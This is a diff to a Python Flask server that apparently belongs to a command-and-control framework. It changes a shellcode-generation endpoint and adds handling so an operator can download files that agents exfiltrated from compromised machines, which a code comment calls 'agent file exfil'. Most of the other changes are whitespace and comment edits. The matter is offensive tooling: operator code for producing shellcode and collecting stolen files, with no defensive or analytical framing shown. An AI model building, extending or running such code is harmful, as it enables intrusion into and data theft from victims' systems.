@@ -133,7 +133,7 @@ def generate_shellcode():
             command = data.get('command')
             if not command:
                 return jsonify({'success': False, 'error': 'Command is required'}), 400
-            shellcode = shellcode_gen.generate_exec(command, platform, msf_payload)
+            shellcode = shellcode_gen.generate_exec(command, platform)
 
         else:
             return jsonify({'success': False, 'error': 'Invalid shellcode type specified'}), 400
@@ -421,10 +421,19 @@ def download_result(task_id):
         if task_id in agent_results:
             entry = agent_results[task_id]
             result = entry.get('result', {})
-            
             try:
                 # Handle image download
                 if isinstance(result, dict):
+                    # Handle file result where result['data'] is a dict (agent file exfil)
+                    if 'data' in result and isinstance(result['data'], dict) and 'data' in result['data']:
+                        file_data = base64.b64decode(result['data']['data'])
+                        filename = result['data'].get('filename', f'{task_id}.bin')
+                        mimetype, _ = mimetypes.guess_type(filename)
+                        if not mimetype:
+                            mimetype = 'application/octet-stream'
+                        return Response(file_data, mimetype=mimetype, headers={
+                            'Content-Disposition': f'attachment;filename={os.path.basename(filename)}'
+                        })
                     if 'data' in result and result.get('format') in ['png', 'jpg', 'jpeg', 'gif', 'bmp']:
                         file_data = base64.b64decode(result['data'])
                         file_format = result.get('format', 'bin')
@@ -433,19 +442,16 @@ def download_result(task_id):
                         return Response(file_data, mimetype=mimetype, headers={
                             'Content-Disposition': f'attachment;filename={os.path.basename(filename)}'
                         })
-                        
-                    # Handle file download
+                    # Handle file download (legacy: result['data'] is base64, result['path'] is filename)
                     if 'data' in result and result.get('path'):
                         file_data = base64.b64decode(result['data'])
                         filename = os.path.basename(result['path'])
-                        # Try to determine mimetype from file extension
                         mimetype, _ = mimetypes.guess_type(filename)
                         if not mimetype:
                             mimetype = 'application/octet-stream'
                         return Response(file_data, mimetype=mimetype, headers={
                             'Content-Disposition': f'attachment;filename={filename}'
                         })
-                        
                     # Handle dictionary/JSON data
                     content = json.dumps(result, indent=2)
                     mimetype = 'application/json'
@@ -453,7 +459,6 @@ def download_result(task_id):
                     return Response(content, mimetype=mimetype, headers={
                         'Content-Disposition': f'attachment;filename={filename}'
                     })
-                    
                 # Handle string data
                 elif isinstance(result, str):
                     content = result
@@ -462,7 +467,6 @@ def download_result(task_id):
                     return Response(content, mimetype=mimetype, headers={
                         'Content-Disposition': f'attachment;filename={filename}'
                     })
-                    
                 # Handle bytes data
                 elif isinstance(result, bytes):
                     content = result
@@ -471,7 +475,6 @@ def download_result(task_id):
                     return Response(content, mimetype=mimetype, headers={
                         'Content-Disposition': f'attachment;filename={filename}'
                     })
-                    
                 # Fallback for any other type
                 else:
                     content = str(result)
@@ -480,11 +483,9 @@ def download_result(task_id):
                     return Response(content, mimetype=mimetype, headers={
                         'Content-Disposition': f'attachment;filename={filename}'
                     })
-                    
             except Exception as e:
                 logging.error(f"Error processing download for task {task_id}: {str(e)}")
                 return str(e), 500
-                
     return 'Result not found', 404
 
 if __name__ == "__main__":
